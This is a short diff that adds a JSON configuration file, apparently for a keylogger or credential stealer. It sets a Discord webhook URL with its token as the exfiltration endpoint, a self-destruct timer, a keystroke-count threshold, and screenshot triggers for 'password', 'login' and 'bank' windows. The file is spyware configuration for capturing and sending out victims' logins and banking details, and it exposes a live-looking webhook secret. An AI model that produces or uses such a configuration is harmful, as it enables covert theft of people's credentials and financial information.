@@ -1,0 +1,6 @@
+{
+    "webhook_url": "https://discord.com/api/webhooks/1350925645462372372/MDhUUjG9MMIe5BIZyv5e3OD8nQrhnjZ_F5hzM4c0eGuIT3C-z_WFZTKUE2rdY7vx1GE6",
+    "self_destruct_time": 3600,
+    "key_threshold": 50,
+    "screenshot_keywords": ["password", "login", "bank"]
+}
